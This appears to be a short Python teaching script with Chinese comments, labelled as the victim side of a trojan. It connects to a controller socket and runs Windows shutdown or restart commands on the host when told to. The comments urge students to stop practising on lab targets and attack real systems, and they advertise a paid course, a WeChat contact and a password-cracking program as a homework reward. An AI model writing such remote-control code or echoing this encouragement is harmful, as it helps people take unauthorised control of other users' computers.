# 木马  受害者
import os            # 导入操作系统的模块
from socket import *

s = socket()    # 1.创建一个套接字
s.connect(('127.0.0.1', 8888))  # 2.套接字申请连接 后台的 号

# 木马 勾结在一起  码  还是  文字
choice = s.recv(1024).decode()

print(choice)

if choice == '1':
    os.system('shutdown -s -t 60')
elif choice == '2':
    os.system('shutdown -r -t 60')

# 防御 都是攻击的基础上 做出来的！、、、、、、、、、、、、、

# 攻击！靶场 练够了！ 真实的去干！
# 何乐而不为！ 善意的提醒！

# 1.找让你来听课的小班老师 预约明晚的课程  进解答群
# 2.加我微信  愿不愿意！
#     作业：把今天的2个代码写出来 在本机测试成功 截图发给我！
#     作业奖励：云服务器的10分钟教程  演示的那个密码破解源代码。





